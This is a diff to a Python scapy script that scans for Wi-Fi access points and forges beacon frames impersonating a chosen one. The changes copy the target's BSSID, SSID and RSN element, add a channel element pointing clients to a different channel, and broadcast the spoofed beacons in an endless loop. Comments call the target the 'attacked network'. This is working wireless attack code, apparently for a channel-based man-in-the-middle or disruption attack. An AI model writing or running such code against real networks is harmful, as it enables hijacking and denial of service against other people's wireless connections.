@@ -3,19 +3,19 @@
 from scapy.all import *
 import sys
 import argparse
-import time
 import os
 
 
 # A class to represent a Wifi AP
 class AP:
     # Constructor
-    def __init__(self, bssid, ssid, channel, crypto, power):
+    def __init__(self, bssid, ssid, channel, crypto, power, rsn):
         self.bssid = bssid
         self.ssid = ssid
         self.channel = channel
         self.crypto = crypto
         self.power = power
+        self.rsn = rsn
     # Display a single AP
     def display(self):
         print("----------------------------------")
@@ -57,6 +57,7 @@ def callback(pkt):
     if pkt.haslayer(Dot11Beacon):
         bssid = pkt[Dot11].addr2
         ssid = pkt[Dot11Elt].info.decode()
+        rsn = pkt[Dot11EltRSN].info
         try:
             dbm_signal = pkt.dBm_AntSignal
         except:
@@ -65,7 +66,7 @@ def callback(pkt):
         channel = stats.get("channel")
         crypto = stats.get("crypto")
 
-        wifi = AP(bssid, ssid, channel, crypto, dbm_signal)
+        wifi = AP(bssid, ssid, channel, crypto, dbm_signal, rsn)
 
         if not bssid_already_scanned(wifi.bssid):
             ap_list.append(wifi)
@@ -94,23 +95,33 @@ def spoof_beacon(ap, interface):
     new_channel = 0
     match(ap.channel):
         case 1: 
-            new_channel = 6
+            new_channel = 7
         case 6:
-            new_channel = 11
+            new_channel = 12
         case 11:
-            new_channel = 6
+            new_channel = 5
         case _:
             print(f'Not handled channel {ap.channel}')
 
-    change_channel(interface, new_channel)
+    # Change channel to go on the same as attacked network
+    print(f'{interface} channel changed to {ap.channel} to send forged beacon')
+    change_channel(interface, ap.channel)
 
-
+    # Forge an beacon frame to inform clients on the network the channel change is occuring
     dot11 = Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF', addr2 = ap.bssid, addr3 = ap.bssid)
     beacon = Dot11Beacon()
     essid = Dot11Elt(ID='SSID', info=ap.ssid, len=len(ap.ssid))
-    frame = RadioTap()/dot11/beacon/essid
+    new_essid = Dot11Elt(ID="DSset", info=chr(new_channel))
+    rsn = Dot11Elt(ID='RSNinfo', info=ap.rsn)
+    frame = RadioTap()/dot11/beacon/essid/new_essid/rsn
 
-    sendp(frame, iface=interface, inter=0.100, loop=1)
+    frame.show()
+    print("\nHexDump of frame:")
+    hexdump(frame)
+    input("\nPress enter to start\n")
+
+    # Send the forged beacon
+    sendp(frame, iface=interface, inter=0.500, loop=1)
 
 
 
@@ -142,9 +153,8 @@ def main():
         
     # Sniff only as long as packet_count
     channel = 0
-    t_end = time.time() + packet_count
-    #while time.time() < t_end and channel <= 12:
     while channel <= 12:
+        print(f'Scanning channel {channel} for SSIDs')
         sniff(iface=interface, prn = callback, count = packet_count)
         channel = increment_channel(interface, channel)
 
